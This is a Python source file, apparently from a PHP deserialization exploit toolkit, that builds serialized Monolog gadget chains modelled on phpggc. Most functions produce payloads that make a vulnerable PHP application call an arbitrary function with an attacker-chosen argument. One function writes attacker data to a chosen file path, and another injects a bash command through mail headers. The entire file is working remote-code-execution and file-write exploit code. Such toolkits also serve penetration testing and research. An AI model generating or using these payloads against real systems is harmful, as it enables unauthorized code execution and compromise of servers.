"""Monolog gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_bool, php_enum, php_int, php_null, php_obj, php_obj_ref, php_str, priv, prot


def _record_array(parameter: str, *, level_null: bool = False, level_int: int | None = None) -> str:
    if level_int is not None:
        level = php_int(level_int)
    elif level_null:
        level = php_null()
    else:
        level = php_null()
    return php_arr([
        (php_int(0), php_str(parameter)),
        (php_str("level"), level),
    ])


def _obj_ref(n: int, *, fast_destruct: bool) -> str:
    """Object handle shifts by +1 when wrapped in fast-destruct temp-key array."""
    return php_obj_ref(n + (1 if fast_destruct else 0))


def _buffer_handler_rce12(function: str, parameter: str, *, fast_destruct: bool = False) -> str:
    buffer = php_arr([(php_int(0), _record_array(parameter, level_null=True))])
    processors = php_arr([
        (php_int(0), php_str("current")),
        (php_int(1), php_str(function)),
    ])
    return php_obj("Monolog\\Handler\\BufferHandler", [
        (prot("handler"), _obj_ref(2, fast_destruct=fast_destruct)),
        (prot("bufferSize"), php_int(-1)),
        (prot("buffer"), buffer),
        (prot("level"), php_null()),
        (prot("initialized"), php_bool(True)),
        (prot("bufferLimit"), php_int(-1)),
        (prot("processors"), processors),
    ])


def build_rce1(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    inner = _buffer_handler_rce12(function, parameter, fast_destruct=fast_destruct)
    outer = php_obj("Monolog\\Handler\\SyslogUdpHandler", [
        (prot("socket"), inner),
    ])
    return maybe_wrap(outer, fast_destruct)


def build_rce2(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    inner = _buffer_handler_rce12(function, parameter, fast_destruct=fast_destruct)
    outer = php_obj("Monolog\\Handler\\SyslogUdpHandler", [
        ("socket", inner),
    ])
    return maybe_wrap(outer, fast_destruct)


def build_rce3(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    mailer = php_obj("Monolog\\Handler\\NativeMailerHandler", [
        (prot("to"), php_null()),
        (prot("subject"), php_null()),
        (prot("headers"), php_null()),
        (prot("level"), php_null()),
        (prot("bubble"), php_bool(False)),
        (prot("formatter"), php_null()),
        (prot("processors"), php_arr([
            (php_int(0), php_str("current")),
            (php_int(1), php_str(function)),
        ])),
    ])
    buffer = php_arr([(php_int(0), _record_array(parameter, level_null=True))])
    handler = php_obj("Monolog\\Handler\\BufferHandler", [
        (prot("handler"), mailer),
        (prot("bufferSize"), php_int(-1)),
        (prot("buffer"), buffer),
        (prot("level"), php_null()),
        (prot("bubble"), php_bool(False)),
        (prot("formatter"), php_null()),
        (prot("processors"), php_null()),
    ])
    return maybe_wrap(handler, fast_destruct)


def _fingers_crossed_test_buffer(parameter: str) -> str:
    return php_arr([
        (php_str("test"), _record_array(parameter, level_null=True)),
    ])


def build_rce5(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    group = php_obj("Monolog\\Handler\\GroupHandler", [
        (prot("processors"), php_arr([
            (php_int(0), php_str("current")),
            (php_int(1), php_str(function)),
        ])),
    ])
    handler = php_obj("Monolog\\Handler\\FingersCrossedHandler", [
        (prot("passthruLevel"), php_int(0)),
        (prot("buffer"), _fingers_crossed_test_buffer(parameter)),
        (prot("handler"), group),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_rce6(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    inner = php_obj("Monolog\\Handler\\BufferHandler", [
        (prot("handler"), php_null()),
        (prot("bufferSize"), php_int(-1)),
        (prot("buffer"), php_null()),
        (prot("level"), php_null()),
        (prot("initialized"), php_bool(True)),
        (prot("bufferLimit"), php_int(-1)),
        (prot("processors"), php_arr([
            (php_int(0), php_str("current")),
            (php_int(1), php_str(function)),
        ])),
    ])
    handler = php_obj("Monolog\\Handler\\FingersCrossedHandler", [
        (prot("passthruLevel"), php_int(0)),
        (prot("buffer"), _fingers_crossed_test_buffer(parameter)),
        (prot("handler"), inner),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_rce7(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    handler = php_obj("Monolog\\Handler\\FingersCrossedHandler", [
        (prot("passthruLevel"), php_int(0)),
        (prot("handler"), _obj_ref(1, fast_destruct=fast_destruct)),
        (prot("buffer"), php_arr([(php_int(0), _record_array(parameter, level_int=0))])),
        (prot("processors"), php_arr([
            (php_int(0), php_str("pos")),
            (php_int(1), php_str(function)),
        ])),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_rce8(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    log_record = php_obj("Monolog\\LogRecord", [
        ("level", php_enum("Monolog\\Level", "Debug")),
        ("mixed", php_str(parameter)),
    ])
    buffer_handler = php_obj("Monolog\\Handler\\BufferHandler", [
        (prot("handler"), _obj_ref(3, fast_destruct=fast_destruct)),
        (prot("bufferSize"), php_int(1)),
        (prot("bufferLimit"), php_int(0)),
        (prot("buffer"), php_arr([(php_int(0), log_record)])),
        (prot("initialized"), php_bool(True)),
        (prot("processors"), php_arr([
            (php_int(0), php_str("get_object_vars")),
            (php_int(1), php_str("end")),
            (php_int(2), php_str(function)),
        ])),
    ])
    group = php_obj("Monolog\\Handler\\GroupHandler", [
        (prot("handlers"), php_arr([(php_int(0), buffer_handler)])),
    ])
    return maybe_wrap(group, fast_destruct)


def build_rce9(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    log_record = php_obj("Monolog\\LogRecord", [
        ("level", _obj_ref(2, fast_destruct=fast_destruct)),
        ("mixed", php_str(parameter)),
    ])
    handler = php_obj("Monolog\\Handler\\FingersCrossedHandler", [
        (prot("passthruLevel"), php_enum("Monolog\\Level", "Debug")),
        (prot("handler"), _obj_ref(1, fast_destruct=fast_destruct)),
        (prot("buffer"), php_arr([(php_int(0), log_record)])),
        (prot("processors"), php_arr([
            (php_int(0), php_str("get_object_vars")),
            (php_int(1), php_str("end")),
            (php_int(2), php_str(function)),
        ])),
    ])
    return maybe_wrap(handler, fast_destruct)


def build_fw1(
    remote_path: str,
    data: str,
    *,
    fast_destruct: bool = False,
    datetime: str = "2026-06-16 11:43:00.970121",
) -> bytes:
    level = php_enum("Monolog\\Level", "Debug")
    record = php_obj("Monolog\\LogRecord", [
        ("level", level),
        ("message", php_str(data)),
        ("datetime", php_obj("DateTimeImmutable", [
            ("date", php_str(datetime)),
            ("timezone_type", php_int(3)),
            ("timezone", php_str("UTC")),
        ])),
    ])
    ref = php_obj_ref(8 + (1 if fast_destruct else 0))
    dedup = php_obj("Monolog\\Handler\\DeduplicationHandler", [
        (prot("deduplicationStore"), php_str(remote_path)),
        (prot("bufferSize"), php_int(1)),
        (prot("buffer"), php_arr([(php_int(0), record)])),
        (prot("deduplicationLevel"), ref),
    ])
    group = php_obj("Monolog\\Handler\\GroupHandler", [
        (prot("handlers"), php_arr([(php_int(0), dedup)])),
    ])
    return maybe_wrap(group, fast_destruct)


def build_rce4(command: str, *, fast_destruct: bool = False) -> bytes:
    mailer = php_obj("Monolog\\Handler\\NativeMailerHandler", [
        (prot("level"), php_int(1)),
        (prot("processors"), php_arr([(php_int(0), php_str("array_reverse"))])),
        (prot("formatter"), php_obj("Monolog\\Formatter\\LineFormatter", [
            (prot("format"), php_str("")),
        ])),
        (prot("maxColumnWidth"), php_int(20)),
        (prot("parameters"), php_arr([(php_int(0), php_str("-be"))])),
        (prot("to"), php_arr([(php_int(0), php_str("init@localhost"))])),
        (prot("headers"), php_arr([
            (php_int(0), php_str(f'${{run{{/bin/bash -c "{command}"}}{{yes}}{{no}}}}')),
        ])),
    ])
    buffer = php_arr([
        (php_int(0), php_arr([
            (php_str("level"), php_int(100)),
            (php_str("message"), php_int(1)),
            (php_str("context"), php_arr([])),
            (php_str("extra"), php_arr([])),
            (php_str("channel"), php_int(1)),
        ])),
    ])
    inner = php_obj("Monolog\\Handler\\BufferHandler", [
        (prot("bufferSize"), php_int(2)),
        (prot("handler"), mailer),
        (prot("buffer"), buffer),
    ])
    rollbar = php_obj("Monolog\\Handler\\RollbarHandler", [
        (priv("Monolog\\Handler\\RollbarHandler", "hasRecords"), php_bool(True)),
        (prot("rollbarLogger"), inner),
    ])
    return maybe_wrap(rollbar, fast_destruct)
